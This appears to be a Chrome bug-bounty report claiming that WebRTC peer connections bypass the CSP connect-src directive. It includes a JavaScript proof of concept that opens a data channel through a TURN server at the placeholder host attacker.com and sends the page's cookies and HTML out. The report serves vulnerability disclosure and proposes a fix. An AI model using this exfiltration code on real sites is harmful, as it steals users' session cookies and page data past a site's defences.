# Chrome VRP Report: CSP connect-src Does Not Block WebRTC Peer Connections

## Summary

`RTCPeerConnection` creation completely ignores Content Security Policy (CSP) `connect-src` directives. A site with strict CSP like `connect-src 'self'` can still have WebRTC connections established to arbitrary servers via STUN/TURN relays. This enables data exfiltration from XSS attacks even on CSP-hardened pages.

## Vulnerability Details

**Component:** `third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.cc:571`

```cpp
// The check at line ~571 only records a UseCounter metric:
UseCounter::Count(context, WebFeature::kRTCPeerConnectionWithCSPViolation);
// But the connection is NOT blocked.
```

When an RTCPeerConnection is created with ICE servers that violate the page's CSP `connect-src` directive:
1. A UseCounter metric is recorded (for telemetry)
2. The connection proceeds normally
3. Data channels can be established and used for bidirectional communication

## Steps to Reproduce

### Setup

Host a page with strict CSP:
```
Content-Security-Policy: default-src 'self'; connect-src 'self'
```

### PoC — XSS Data Exfiltration via WebRTC Despite CSP

```javascript
// This runs despite CSP connect-src 'self'
const pc = new RTCPeerConnection({
  iceServers: [{
    urls: 'turn:attacker.com:3478',
    username: 'user',
    credential: 'pass'
  }]
});

// Create data channel for exfiltration
const dc = pc.createDataChannel('exfil');
dc.onopen = () => {
  // Exfiltrate data through the TURN relay
  dc.send(document.cookie);
  dc.send(document.body.innerHTML);
};

// Complete the WebRTC handshake (simplified)
const offer = await pc.createOffer();
await pc.setLocalDescription(offer);
// Send SDP to attacker's signaling server via other means
// (e.g., DNS exfil, or the CSP might allow certain fetch targets)
```

### Expected Behavior

The `RTCPeerConnection` creation or ICE server connection should be blocked when the ICE server URLs violate the page's CSP `connect-src` directive.

### Actual Behavior

The connection proceeds normally. CSP only affects fetch(), XMLHttpRequest, WebSocket, and EventSource — not WebRTC.

## Impact

1. **CSP Bypass for Data Exfiltration**: XSS attacks on CSP-protected sites can exfiltrate data via WebRTC data channels through TURN relays

2. **Defense-in-Depth Failure**: CSP `connect-src` is supposed to be the last line of defense against XSS data exfiltration. WebRTC being exempt defeats this purpose.

3. **Silent Bypass**: The UseCounter metric is the only indication; no console warning or error is shown to developers.

## Affected Versions

All Chrome versions with RTCPeerConnection support.

## Severity Assessment

**Medium** — Requires XSS as a prerequisite, but the CSP bypass is particularly concerning because CSP is specifically designed to mitigate XSS impact. Sites that rely on CSP `connect-src` for data exfiltration prevention have a false sense of security.

## Suggested Fix

Apply CSP `connect-src` checks to RTCPeerConnection ICE server URLs. If the ICE server URL violates the policy, either:
1. Block the RTCPeerConnection creation entirely
2. Block connections to violating ICE servers while allowing same-origin STUN/TURN
